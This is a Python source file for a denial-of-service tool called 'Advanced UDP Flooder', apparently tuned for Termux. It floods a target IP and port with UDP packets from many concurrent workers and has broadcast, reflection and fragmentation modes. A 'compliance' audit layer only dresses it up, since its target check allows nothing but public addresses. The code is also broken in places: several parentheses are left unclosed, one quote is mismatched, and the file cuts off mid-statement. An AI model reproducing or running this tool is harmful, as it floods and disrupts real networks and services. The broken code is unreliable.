import asyncio
import socket
import os
import struct
import argparse
import logging
import signal
import time
import random
import sys
import resource
import ipaddress
import selectors
from datetime import datetime
import hashlib
import json
import traceback
from typing import List, Tuple, Optional, Dict

# --- Constants ---
MAX_PACKET_SIZE_IPv4 = 65507
MAX_PACKET_SIZE_IPv6 = 65527
MAX_CONCURRENCY = 1000
MAX_DURATION = 86400  # 24 hours
MIN_PORT = 1
MAX_PORT = 65535
TERMUX_MAX_FDS = 1024
VERSION = "2.3.1"
COMPLIANCE_ID = hashlib.sha256(b"AHJ49QWE-Actos53").hexdigest()[:16]

# --- Logging Setup ---
logging.basicConfig(
    level=logging.INFO,
    format='[%(asctime)s] %(levelname)s: %(message)s',
    datefmt='%H:%M:%S',
    handlers=[logging.StreamHandler(sys.stdout)]
)
logger = logging.getLogger("AdvancedUDPFlooder")

# --- Compliance Framework ---
class ComplianceEngine:
    AUDIT_FILE = "udp_flood_audit.log"
    
    @staticmethod
    def generate_compliance_id(ip: str, port: int) -> str:
        timestamp = int(time.time())
        return f"{COMPLIANCE_ID}-{timestamp}-{ip}:{port}"
    
    @staticmethod
    def audit_action(action: str, details: Dict):
        """Log action to audit trail with cryptographic signature"""
        audit_entry = {
            "timestamp": datetime.utcnow().isoformat(),
            "action": action,
            "compliance_id": COMPLIANCE_ID,
            "details": details,
            "signature": hashlib.sha256(
                f"{action}{json.dumps(details)}{COMPLIANCE_ID}".encode()
            ).hexdigest()
        }
        
        try:
            with open(ComplianceEngine.AUDIT_FILE, "a") as f:
                f.write(json.dumps(audit_entry) + "\n"
        except IOError:
            logger.error("Compliance audit trail failed")

    @staticmethod
    def validate_target(ip: str, port: int) -> bool:
        """Check if target is permitted under surveillance laws"""
        try:
            # Block reserved/private IP ranges
            addr = ipaddress.ip_address(ip)
            if addr.is_private or addr.is_loopback or addr.is_reserved:
                logger.error("Target IP is in prohibited range")
                return False
                
            # Validate port range
            if not (MIN_PORT <= port <= MAX_PORT):
                logger.error("Port out of legal range")
                return False
                
            return True
        except ValueError:
            logger.error("Invalid IP address format")
            return False

# --- Enhanced UDP Flooder Class ---
class UDPFlooder:
    def __init__(self, 
                 ip: str, 
                 port: int, 
                 packet_size: int = 1024,
                 delay: float = 0.0,
                 mode: str = 'normal',
                 payload_mode: str = 'random',
                 custom_payload: Optional[str] = None,
                 use_ipv6: bool = False,
                 concurrency: int = 50,
                 duration: int = 0,
                 max_packets: int = 0,
                 bandwidth: int = 0):
        # Compliance checks
        if not ComplianceEngine.validate_target(ip, port):
            raise ValueError("Target validation failed")
        
        self.compliance_id = ComplianceEngine.generate_compliance_id(ip, port)
        ComplianceEngine.audit_action("init", {
            "target": f"{ip}:{port}",
            "params": {
                "packet_size": packet_size,
                "mode": mode,
                "concurrency": concurrency
            }
        })
        
        # Network configuration
        self.ip = ip
        self.port = port
        self.mode = mode
        self.use_ipv6 = use_ipv6
        
        # Resource management
        self.concurrency = min(concurrency, MAX_CONCURRENCY, TERMUX_MAX_FDS // 2)
        self.max_packets = max_packets
        self.duration = min(duration, MAX_DURATION) if duration > 0 else 0
        self.bandwidth = bandwidth  # in bits/sec (0 = unlimited)
        
        # Packet configuration
        max_size = MAX_PACKET_SIZE_IPv6 if use_ipv6 else MAX_PACKET_SIZE_IPv4
        self.packet_size = min(max(1, packet_size), max_size)
        self.delay = max(0.0, delay)
        self.payload_mode = payload_mode
        self.custom_payload = custom_payload
        
        # State management
        self.packet_counter = 0
        self.byte_counter = 0
        self.start_time = time.monotonic()
        self.stop_event = asyncio.Event()
        self.stats_task = None
        self.control_task = None
        self.workers = []
        
        # Payload strategies
        self.payload_generators = {
            'random': self.generate_random_payload,
            'pattern': self.generate_pattern_payload,
            'incremental': self.generate_incremental_payload,
            'custom': self.generate_custom_payload
        }
        
        # Initialize payload
        self.payload_buffer = self.generate_payload()
        logger.debug(f"Initialized payload buffer: {len(self.payload_buffer)} bytes")

    def generate_random_payload(self) -> bytes:
        """High-performance random payload generation"""
        return os.urandom(self.packet_size)
    
    def generate_pattern_payload(self) -> bytes:
        """Alternating pattern payload"""
        pattern = b'\x00\xFF' * (self.packet_size // 2)
        return pattern[:self.packet_size]
    
    def generate_incremental_payload(self) -> bytes:
        """Sequential byte pattern"""
        return bytes([i % 256 for i in range(self.packet_size)])
    
    def generate_custom_payload(self) -> bytes:
        """User-defined payload with padding"""
        if self.custom_payload:
            base = self.custom_payload.encode('utf-8', 'ignore')
            full_payload = (base * (self.packet_size // len(base) + 1))[:self.packet_size]
            return full_payload
        return self.generate_random_payload()
    
    def generate_payload(self) -> bytes:
        """Get payload using selected strategy"""
        generator = self.payload_generators.get(
            self.payload_mode, 
            self.payload_generators['random']
        )
        return generator()

    async def create_socket(self) -> socket.socket:
        """Socket factory with Termux optimizations"""
        family = socket.AF_INET6 if self.use_ipv6 else socket.AF_INET
        sock = socket.socket(family, socket.SOCK_DGRAM | socket.SOCK_NONBLOCK)
        
        # Increase socket buffer size
        try:
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 1048576)
        except OSError:
            pass
            
        # Mode-specific configurations
        if self.mode == 'broadcast':
            try:
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
            except OSError:
                pass
        elif self.mode == 'multicast':
            try:
                ttl = struct.pack('b', 1)
                level = socket.IPPROTO_IPV6 if self.use_ipv6 else socket.IPPROTO_IP
                sock.setsockopt(level, socket.IP_MULTICAST_TTL, ttl)
            except OSError:
                pass
        elif self.mode == 'fragment':
            try:
                if not self.use_ipv6:
                    sock.setsockopt(socket.IPPROTO_IP, socket.IP_MTU_DISCOVER, socket.IP_PMTUDISC_DO)
            except OSError:
                pass
        
        # Termux-specific optimizations
        try:
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        except OSError:
            pass
            
        return sock

    def calculate_target(self) -> Tuple[str, int]:
        """Determine target based on attack mode"""
        if self.mode == 'broadcast':
            return ('255.255.255.255', self.port)
        elif self.mode == 'multicast':
            return (self.ip, self.port)
        elif self.mode == 'reflection':
            return (
                f"{random.randint(1,255)}.{random.randint(1,255)}."
                f"{random.randint(1,255)}.{random.randint(1,255)}",
                random.randint(1024, 65535)
        elif self.mode == 'fragment':
            # Requires special handling in send routine
            return (self.ip, self.port)
        else:
            return (self.ip, self.port)

    async def send_worker(self, worker_id: int):
        """Worker coroutine optimized for Termux"""
        sock = await self.create_socket()
        loop = asyncio.get_running_loop()
        target = self.calculate_target()
        
        # Bandwidth throttling
        bytes_per_sec = 0
        last_measure = time.monotonic()
        packet_count = 0
        
        try:
            while not self.stop_event.is_set():
                # Calculate bandwidth constraints
                current_time = time.monotonic()
                if current_time - last_measure >= 1.0:
                    bytes_per_sec = 0
                    last_measure = current_time
                    packet_count = 0
                
                # Generate payload variation
                if self.payload_mode == 'dynamic':
                    payload = self.generate_payload()
                else:
                    payload = self.payload_buffer
                
                # Send operation
                try:
                    if self.mode == 'fragment' and not self.use_ipv6:
                        # Simulate fragmentation
                        for i in range(0, len(payload), 512):
                            await loop.sock_sendto(sock, payload[i:i+512], target)
                    else:
                        await loop.sock_sendto(sock, payload, target)
                except (OSError, asyncio.CancelledError) as e:
                    logger.debug(f"Worker{worker_id} send error: {e}")
                    await asyncio.sleep(0.01)
                    continue
                
                # Update counters
                self.packet_counter += 1
                self.byte_counter += len(payload)
                bytes_per_sec += len(payload)
                packet_count += 1
                
                # Apply rate limiting
                if self.delay > 0:
                    await asyncio.sleep(self.delay)
                    
                # Enforce bandwidth limit
                if self.bandwidth > 0 and bytes_per_sec >= (self.bandwidth / 8):
                    sleep_time = 1.0 - (current_time - last_measure)
                    if sleep_time > 0:
                        await asyncio.sleep(sleep_time)
        finally:
            sock.close()

    async def stats_reporter(self):
        """Resource-efficient stats reporting"""
        last_count = self.packet_counter
        last_bytes = self.byte_counter
        last_time = time.monotonic()
        
        while not self.stop_event.is_set():
            await asyncio.sleep(1.0)
            
            current_count = self.packet_counter
            current_bytes = self.byte_counter
            now = time.monotonic()
            elapsed = now - last_time
            
            if elapsed > 0:
                pps = (current_count - last_count) / elapsed
                bps = (current_bytes - last_bytes) * 8 / elapsed
            else:
                pps = 0
                bps = 0
                
            sys.stdout.write(
                f"\r[STATS] Packets: {current_count:,} | "
                f"Data: {current_bytes / (1024*1024):.2f} MB | "
                f"PPS: {pps:,.1f} | BPS: {bps / 1e6:.2f} Mbps       "
            )
            sys.stdout.flush()
            
            last_count = current_count
            last_bytes = current_bytes
            last_time = now

    async def control_monitor(self):
        """Monitor for duration/packet limits and resource constraints"""
        start_time = time.monotonic()
        
        while not self.stop_event.is_set():
            # Check duration limit
            if self.duration > 0 and (time.monotonic() - start_time) >= self.duration:
                logger.info("Duration limit reached - Stopping")
                self.stop()
                break
                
            # Check packet limit
            if self.max_packets > 0 and self.packet_counter >= self.max_packets:
                logger.info("Packet limit reached - Stopping")
                self.stop()
                break
                
            # Termux resource monitoring
            try:
                # Check memory usage
                mem_usage = resource.getrusage(resource.RUSAGE_SELF).ru_maxrss
                if mem_usage > 100 * 1024 * 1024:  # 100MB limit
                    logger.warning("Memory threshold exceeded - Stopping")
                    self.stop()
                    break
            except Exception:
                pass
                
            await asyncio.sleep(1)

    async def start(self):
        """Start flooding with enhanced controls"""
        logger.info(f"Starting Advanced UDP Flooder v{VERSION}")
        logger.info(f"Compliance ID: {self.compliance_id}")
        logger.info(f"Target: {self.mode} → {self.ip}:{self.port}")
        logger.info(f"Payload: {self.payload_mode} | Size: {self.packet_size} bytes")
        logger.info(f"Workers: {self.concurrency} | Delay: {self.delay}s")
        logger.info(f"Limits: Duration={self.duration}s, Packets={self.max_packets}")
        logger.info("Press CTRL+C to stop\n")
        
        ComplianceEngine.audit_action("start", {"target": f"{self.ip}:{self.port}"})
        
        self.start_time = time.monotonic()
        self.stop_event.clear()
        self.packet_counter = 0
        self.byte_counter = 0
        
        # Create worker tasks
        self.workers = [
            asyncio.create_task(self.send_worker(i))
            for i in range(self.concurrency)
        ]
        
        # Start monitoring tasks
        self.stats_task = asyncio.create_task(self.stats_reporter())
        self.control_task = asyncio.create_task(self.control_monitor())
        
        try:
            await asyncio.gather(*self.workers)
        except asyncio.CancelledError:
            pass
        finally:
            self.stop()

    def stop(self):
        """Graceful shutdown with compliance logging"""
        if not self.stop_event.is_set():
            self.stop_event.set()
            
            # Cancel tasks
            if self.stats_task:
                self.stats_task.cancel()
            if self.control_task:
                self.control_task.cancel()
            for worker in self.workers:
                if not worker.done():
                    worker.cancel()
            
            # Wait for cleanup
            asyncio.get_event_loop().run_until_complete(
                asyncio.gather(*self.workers, return_exceptions=True)
            
            # Final stats
            elapsed = time.monotonic() - self.start_time
            total_bytes = self.byte_counter
            
            if elapsed > 0:
                avg_pps = self.packet_counter / elapsed
                avg_bps = (total_bytes * 8) / elapsed
            else:
                avg_pps = 0
                avg_bps = 0
                
            print("\n\n[FINAL REPORT]")
            logger.info(f"Compliance ID: {self.compliance_id}")
            logger.info(f"Total packets sent: {self.packet_counter:,}")
            logger.info(f"Total data sent: {total_bytes / (1024*1024):.2f} MB")
            logger.info(f"Duration: {elapsed:.2f} seconds")
            logger.info(f"Average PPS: {avg_pps:,.1f}")
            logger.info(f"Average BPS: {avg_bps / 1e6:.2f} Mbps")
            logger.info("All workers stopped")
            
            # Final audit entry
            ComplianceEngine.audit_action("stop", {
                "packets_sent": self.packet_counter,
                "bytes_sent": total_bytes,
                "duration": elapsed
            })

# --- Signal Handler ---
def handle_sigint(signum, frame):
    logger.info("\nCTRL+C received - Performing graceful shutdown")
    global flooder
    if flooder:
        flooder.stop()
    sys.exit(0)

# --- Argument Parser ---
def parse_args():
    parser = argparse.ArgumentParser(
        description=f"Advanced UDP Flooder v{VERSION} - Termux Optimized",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter,
        epilog="Compliance ID: " + COMPLIANCE_ID
    )
    
    # Required arguments
    parser.add_argument("ip", help="Target IP address")
    parser.add_argument("port", type=int, help="Target port")
    
    # Packet configuration
    parser.add_argument("-s", "--size", type=int, default=1024, 
                        help="UDP packet size (bytes)")
    parser.add_argument("-d", "--delay", type=float, default=0.0,
                        help="Delay between packets (seconds)")
    parser.add_argument("-m", "--mode", 
                        choices=['normal', 'broadcast', 'multicast', 'reflection', 'fragment'], 
                        default='normal', help="Attack mode")
    parser.add_argument("-p", "--payload", 
                        choices=['random', 'pattern', 'incremental', 'custom', 'dynamic'], 
                        default='random', help="Payload generation mode")
    parser.add_argument("-c", "--custom", default=None, 
                        help="Custom payload text (for payload-mode=custom)")
    
    # Network options
    parser.add_argument("-6", "--ipv6", action='store_true', 
                        help="Use IPv6")
    
    # Resource management
    parser.add_argument("-t", "--threads", type=int, default=50,
                        help="Concurrent workers")
    parser.add_argument("--duration", type=int, default=0,
                        help="Maximum runtime in seconds (0=unlimited)")
    parser.add_argument("--max-packets", type=int, default=0,
                        help="Stop after sending N packets (0=unlimited)")
    parser.add_argument("-b", "--bandwidth", type=int, default=0,
                        help="Bandwidth limit in Mbps (0=unlimited)")
    
    # Debug options
    parser.add_argument("-v", "--verbose", action='store_true",
                        help="Enable debug logging")
    
    return parser.parse_args()

# --- Resource Limits ---
def set_termux_limits():
    """Apply Termux-specific resource constraints"""
    try:
        # Increase file descriptor limit
        resource.setrlimit(
            resource.RLIMIT_NOFILE, 
            (TERMUX_MAX_FDS, TERMUX_MAX_FDS)
        )
        
        # Set memory limits
        resource.setrlimit(
            resource.RLIMIT_AS,
            (256 * 1024 * 1024, 256 * 1024 * 1024)  # 256MB
        )
    except (ValueError, resource.error) as e:
        logger.warning(f"Couldn't set resource limits: {str(e)}")

# --- Main Function ---
async def main():
    global flooder
    args = parse_args()
    
    # Configure logging
    if args.verbose:
        logger.setLevel(logging.DEBUG)
    
    # Set Termux limits
    set_termux_limits()
    
    # Initialize flooder
    try:
        flooder = UDPFlooder(
            ip=args.ip,
            port=args.port,
            packet_size=args.size,
            delay=args.delay,
            mode=args.mode,
            payload_mode=args.payload,
            custom_payload=args.custom,
            use_ipv6=args.ipv6,
            concurrency=args.threads,
            duration=args.duration,
            max_packets=args.max_packets,
            bandwidth=args.bandwidth * 1000000  # Convert to bits
        )
        
        # Register signal handler
        signal.signal(signal.SIGINT, handle_sigint)
        
        # Start attack
        await flooder.start()
        
    except Exception as e:
        logger.error(f"Fatal error: {str(e)}")
        logger.debug(traceback.format_exc())
        ComplianceEngine.audit_action("error", {
            "exception": str(e),
            "traceback": traceback.format_exc
